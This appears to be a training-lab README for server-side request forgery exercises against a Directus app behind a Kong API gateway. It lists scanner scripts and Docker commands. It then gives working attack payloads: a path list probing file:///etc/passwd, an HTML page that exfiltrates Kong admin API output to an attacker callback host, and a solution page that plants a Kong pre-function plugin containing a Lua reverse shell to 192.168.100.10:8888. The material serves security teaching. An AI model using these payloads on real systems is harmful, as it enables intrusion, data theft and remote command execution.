Server Side Request Forgery
=======

## Exercise Starter Scripts
[Route Buster](templates/route_buster.py)
[Port Scanner](templates/ssrf_port_scanner.py)
[Gateway Scanner](templates/ssrf_gateway_scanner.py)


## Exercise Solutions
[Route Buster](solutions/route_buster.py)
[Port Scanner](solutions/ssrf_port_scanner.py)
[Gateway Scanner](solutions/ssrf_gateway_scanner.py)
[Subnet Scanner](solutions/ssrf_subnet_scanner.py)
[Path Scanner](solutions/ssrf_path_scanner.py)


## Source Code

[Directus](directus-9.0.0-rc.34.zip)
[URL to PDF API](url-to-pdf-api-master.zip)


## Docker Commands

### Shut down the API gateway and all containers
```
docker-compose -f ~/apps/conf/docker-compose.yml down 
```

### Start the API gateway and all containers
```
docker-compose -f ~/apps/conf/docker-compose.yml up
```

###  List information about running containers
```
docker ps 
```

### List Docker networks
```
docker network ls
```

### Inspect API gateway network
```
docker network inspect conf_microservices
```

### Run a command in a container
```
docker-compose -f ~/apps/conf/docker-compose.yml exec <image name> <command>
```
Note that the image name needs to match the name from the docker-compose.yml file. 

Example - run /bin/bash in the Directus container.
```
docker-compose -f ~/apps/conf/docker-compose.yml exec directus /bin/bash
``` 

### View log file for container
```
docker logs <container name>
``` 
The container name must match the name of a running container, not the image name.

Example - view log file for the running Kong container:
```
docker logs conf_kong_1
``` 

## Kong API Gateway endpoints

### List all plugins 
```
GET http://localhost:8001/plugins
```

### Get plugin details
```
GET http://localhost:8001/plugins/<id>
```

### Delete plugin
```
DELETE http://localhost:8001/plugins/<id>
```

## Miscellaneous Files

**paths.txt**
```
?data=foobar
?file=file:///etc/passwd
?url=http://192.168.100.10/render/url
?input=foobar
?target=http://192.168.100.10/render/target
```


**SSRF HTML Page**

offsec.html

```
<html>
<head>
<script>
function runscript() {
    fetch("http://192.168.2.154/itworked");
}
</script>
</head>
<body onload='runscript()'>
<div></div>
</body>
</html>
```

**Sample curl request**
```
curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.3:9000/api/render?url=http://192.168.2.154/offsec.html"}' http://apigateway:8000/files/import
``` 

**Exfil**

exfil.html   

```
<html>
<head>
<script>
function runscript() {
    fetch("http://172.16.16.KONG_IP:8001")
    .then((response) => response.text())
    .then((data) => {
        fetch("http://192.168.100.10/callback?" + encodeURIComponent(data));
    }).catch(err => {
        fetch("http://192.168.100.10/error?" + encodeURIComponent(err));
    });
}
</script>
</head>
<body onload='runscript()'>
<div></div>
</body>
</html>
```

**Serverless Function RCE - Template**

rce.html template
```
<html>
<head>
<script>

function createService() {
    fetch("http://KONG_IP:8001/services", {
      method: "post",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({---FIX ME---})
    }).then(function (route) {
      createRoute();
    });
}

function createRoute() {
    fetch("http://KONG_IP:8001/services/supersecret/routes", { 
      method: "post",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({--FIX ME---})
    }).then(function (plugin) {
      createPlugin();
    });  
}

function createPlugin() {
    fetch("http://KONG_IP:8001/services/supersecret/plugins", { 
      method: "post",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({---FIX ME---})
    }).then(function (callback) {
      fetch("http://192.168.100.10/callback?setupComplete");
    });  
}
</script>
</head>
<body onload='createService()'>
<div></div>
</body>
</html>
```

**Serverless Function RCE - Solution**

rce.html

```
<html>
<head>
<script>

function createService() {
    fetch("http://172.16.16.KONG_IP:8001/services", {
      method: "post",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({"name":"supersecret", "url": "http://127.0.0.1/"})
    }).then(function (route) {
      createRoute();
    });
}

function createRoute() {
    fetch("http://172.16.16.KONG_IP:8001/services/supersecret/routes", { 
      method: "post",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({"paths": ["/supersecret"]})
    }).then(function (plugin) {
      createPlugin();
    });  
}

function createPlugin() {
    fetch("http://172.16.16.KONG_IP:8001/services/supersecret/plugins", { 
      method: "post",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({"name":"pre-function", "config" :{ "access" :["local s=require('socket');local t=assert(s.tcp());t:connect('192.168.100.10',8888);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"]}})
    }).then(function (callback) {
      fetch("http://192.168.100.10/callback?setupComplete");
    });  
}
</script>
</head>
<body onload='createService()'>
<div></div>
</body>
</html>
```